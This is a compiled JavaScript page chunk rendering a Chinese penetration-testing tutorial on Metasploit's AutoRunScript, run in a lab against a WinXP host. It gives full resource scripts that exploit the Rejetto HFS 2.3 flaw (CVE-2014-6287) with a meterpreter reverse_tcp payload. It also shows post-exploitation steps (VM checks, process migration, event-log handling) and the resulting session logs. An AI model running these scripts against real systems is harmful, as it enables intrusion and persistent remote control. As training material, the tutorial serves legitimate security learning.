(window.webpackJsonp=window.webpackJsonp||[]).push([[277],{567:function(s,e,t){"use strict";t.r(e);var r=t(7),n=Object(r.a)({},(function(){var s=this,e=s._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"在metasploit中使用autorunscript"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#在metasploit中使用autorunscript"}},[s._v("#")]),s._v(" 在Metasploit中使用AutoRunScript")]),s._v(" "),e("p",[s._v("Metasploit提供了强大的AutoRunScript工具，可以通过收入show advanced查看AutoRunScript的选项。它可以实现自动化的后渗透测试，只需执行一次就可以获得对目标的控制权限。我们可以通过输入set AutoRunScript [script-name]来设置AutoRunScript的选项，也可以在资源脚本中直接设置，后者一次性自动完成全部渗透操作和后渗透操作。通过使用multi_script和multi_console_command模块，AutoRunScript还可以一次性运行多个后渗透脚本。下面我们来进行实战：")]),s._v(" "),e("p",[s._v("攻击机 kali 192.168.175.128")]),s._v(" "),e("p",[s._v("靶机 WinXP 192.168.175.130")]),s._v(" "),e("p",[s._v("注意：这里的示例中在靶机上部署了HFS 2.3，以攻击HFS2.3的漏洞为例实施的。有关如何部署HFS2.3服务，请参考《"),e("a",{attrs:{href:"https://blog.csdn.net/l1028386804/article/details/86567192",target:"_blank",rel:"noopener noreferrer"}},[s._v("Metasploit实战二之——对威胁建模(附加搭建CVE:2014-6287漏洞环境)"),e("OutboundLink")],1),s._v("》。")]),s._v(" "),e("h3",{attrs:{id:"使用autorunscript选项中的multiscript模块"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#使用autorunscript选项中的multiscript模块"}},[s._v("#")]),s._v(" 使用AutoRunScript选项中的multiscript模块")]),s._v(" "),e("h4",{attrs:{id:"创建自动化后渗透脚本multi-script"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#创建自动化后渗透脚本multi-script"}},[s._v("#")]),s._v(" 创建自动化后渗透脚本multi_script")]),s._v(" "),e("p",[s._v("脚本内容如下：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("run post/windows/gather/checkvm\nrun post/windows/manage/migrate\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[s._v("这里，我们将脚本multi_script保存到/root/my_scripts目录下。")]),s._v(" "),e("p",[s._v("这个脚本主要用于后渗透测试，实现了checkvm(检查目标系统是否运行在虚拟环境的模块)和migrate(将攻击载荷迁移到安全进程的模块)模块自动化的后渗透脚本。")]),s._v(" "),e("h4",{attrs:{id:"创建渗透脚本resource-complete"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#创建渗透脚本resource-complete"}},[s._v("#")]),s._v(" 创建渗透脚本resource_complete")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("use exploit/windows/http/rejetto_hfs_exec\nset payload windows/meterpreter/reverse_tcp\nset RHOST 192.168.175.130\nset RPORT 8080\nset LHOST 192.168.175.128\nset LPORT 2222\nset AutoRunScript multi_console_command -rc /root/my_scripts/multi_script\nexploit\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br")])]),e("p",[s._v("这个脚本同样保存到/root/my_scripts目录下")]),s._v(" "),e("p",[s._v("这个脚本设置了对HFS文件服务器进行渗透所必需的所有参数，并实现了攻击的自动化，也可以是使用multi_console_command对AutoRunScript进行设置，将multi_console_command设定为-rc，可以执行对个后渗透脚本。")]),s._v(" "),e("h4",{attrs:{id:"运行渗透脚本resource-complete"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#运行渗透脚本resource-complete"}},[s._v("#")]),s._v(" 运行渗透脚本resource_complete")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("msfconsole\nmsf5 > resource /root/my_scripts/resource_complete\n[*] Processing /root/my_scripts/resource_complete for ERB directives.\nresource (/root/my_scripts/resource_complete)> use exploit/windows/http/rejetto_hfs_exec\nresource (/root/my_scripts/resource_complete)> set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nresource (/root/my_scripts/resource_complete)> set RHOST 192.168.175.130\nRHOST => 192.168.175.130\nresource (/root/my_scripts/resource_complete)> set RPORT 8080\nRPORT => 8080\nresource (/root/my_scripts/resource_complete)> set LHOST 192.168.175.128\nLHOST => 192.168.175.128\nresource (/root/my_scripts/resource_complete)> set LPORT 2222\nLPORT => 2222\nresource (/root/my_scripts/resource_complete)> set AutoRunScript multi_console_command -rc /root/my_scripts/multi_script\nAutoRunScript => multi_console_command -rc /root/my_scripts/multi_script\nresource (/root/my_scripts/resource_complete)> exploit\n\n[*] Started reverse TCP handler on 192.168.175.128:2222 \n[*] Using URL: http://0.0.0.0:8080/E9UzLCydhDL\n[*] Local IP: http://192.168.175.128:8080/E9UzLCydhDL\n[*] Server started.\n[*] Sending a malicious request to /\n[*] Payload request received: /E9UzLCydhDL\n[*] Sending stage (179779 bytes) to 192.168.175.130\n[*] Meterpreter session 1 opened (192.168.175.128:2222 -> 192.168.175.130:1060) at 2019-01-26 10:16:09 +0800\n[*] Session ID 1 (192.168.175.128:2222 -> 192.168.175.130:1060) processing AutoRunScript 'multi_console_command -rc /root/my_scripts/multi_script'\n[*] Running Command List ...\n[!] Tried to delete %TEMP%\\xBDTumQie.vbs, unknown result\n[*] Server stopped.\n\nmeterpreter >\n[*] Checking if LIUYAZHUANG is a Virtual Machine .....\n[+] This is a VMware Virtual Machine\n[*] Running module against LIUYAZHUANG\n[*] Current server process: qQbMLQjEENOQL.exe (1592)\n[*] Spawning notepad.exe process to migrate to\n[+] Migrating to 1380\n[+] Successfully migrated to process 1380\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br"),e("span",{staticClass:"line-number"},[s._v("32")]),e("br"),e("span",{staticClass:"line-number"},[s._v("33")]),e("br"),e("span",{staticClass:"line-number"},[s._v("34")]),e("br"),e("span",{staticClass:"line-number"},[s._v("35")]),e("br"),e("span",{staticClass:"line-number"},[s._v("36")]),e("br"),e("span",{staticClass:"line-number"},[s._v("37")]),e("br"),e("span",{staticClass:"line-number"},[s._v("38")]),e("br"),e("span",{staticClass:"line-number"},[s._v("39")]),e("br")])]),e("p",[s._v("我们看到，checkvm和migrate模块都已经成功执行，目标运行在VMWare上，控制程序也已经成功迁移到了1380进程上。")]),s._v(" "),e("h4",{attrs:{id:"使用autorunscript选项中的multiscript模块-2"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#使用autorunscript选项中的multiscript模块-2"}},[s._v("#")]),s._v(" 使用AutoRunScript选项中的multiscript模块")]),s._v(" "),e("p",[s._v("可以使用multiscript模块创建一个后渗透脚本")]),s._v(" "),e("h4",{attrs:{id:"创建后渗透脚本multi-scr-rc"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#创建后渗透脚本multi-scr-rc"}},[s._v("#")]),s._v(" 创建后渗透脚本multi_scr.rc")]),s._v(" "),e("p",[s._v("脚本内容如下:")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("checkvm\nmigrate -n explorer.exe\nget_env\nevent_manager -i\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br")])]),e("p",[s._v("这里，我们同样把这个脚本保存在/root/my_scripts目录下。")]),s._v(" "),e("h4",{attrs:{id:"创建渗透脚本resource-rc"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#创建渗透脚本resource-rc"}},[s._v("#")]),s._v(" 创建渗透脚本resource_rc")]),s._v(" "),e("p",[s._v("具体内容如下：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("use exploit/windows/http/rejetto_hfs_exec\nset payload windows/meterpreter/reverse_tcp\nset RHOST 192.168.175.130\nset RPORT 8080\nset LHOST 192.168.175.128\nset LPORT 2222\nset AutoRunScript multiscript -rc /root/my_script/multi_scr.rc\nexploit\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br")])]),e("h4",{attrs:{id:"运行渗透脚本"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#运行渗透脚本"}},[s._v("#")]),s._v(" 运行渗透脚本")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("msf5 > resource /root/my_scripts/resource_rc\n[*] Processing /root/my_scripts/resource_rc for ERB directives.\nresource (/root/my_scripts/resource_rc)> use exploit/windows/http/rejetto_hfs_exec\nresource (/root/my_scripts/resource_rc)> set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nresource (/root/my_scripts/resource_rc)> set RHOST 192.168.175.130\nRHOST => 192.168.175.130\nresource (/root/my_scripts/resource_rc)> set RPORT 8080\nRPORT => 8080\nresource (/root/my_scripts/resource_rc)> set LHOST 192.168.175.128\nLHOST => 192.168.175.128\nresource (/root/my_scripts/resource_rc)> set LPORT 2222\nLPORT => 2222\nresource (/root/my_scripts/resource_rc)> set AutoRunScript multiscript -rc /root/my_script/multi_scr.rc\nAutoRunScript => multiscript -rc /root/my_script/multi_scr.rc\nresource (/root/my_scripts/resource_rc)> exploit\n\n[*] Started reverse TCP handler on 192.168.175.128:2222 \n[*] Using URL: http://0.0.0.0:8080/YfmEYmEV9x\n[*] Local IP: http://192.168.175.128:8080/YfmEYmEV9x\n[*] Server started.\n[*] Sending a malicious request to /\n[*] Payload request received: /YfmEYmEV9x\n[*] Sending stage (179779 bytes) to 192.168.175.130\n[*] Meterpreter session 1 opened (192.168.175.128:2222 -> 192.168.175.130:1065) at 2019-01-27 11:50:34 +0800\n[*] Session ID 1 (192.168.175.128:2222 -> 192.168.175.130:1065) processing AutoRunScript 'multiscript -rc /root/my_script/multi_scr.rc'\n[!] Tried to delete %TEMP%\\bMXpbLteZtoos.vbs, unknown result\n[*] Server stopped.\n\nmeterpreter > \n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br")])]),e("h2",{attrs:{id:"写在最后"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),e("blockquote",[e("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);e.default=n.exports}}]);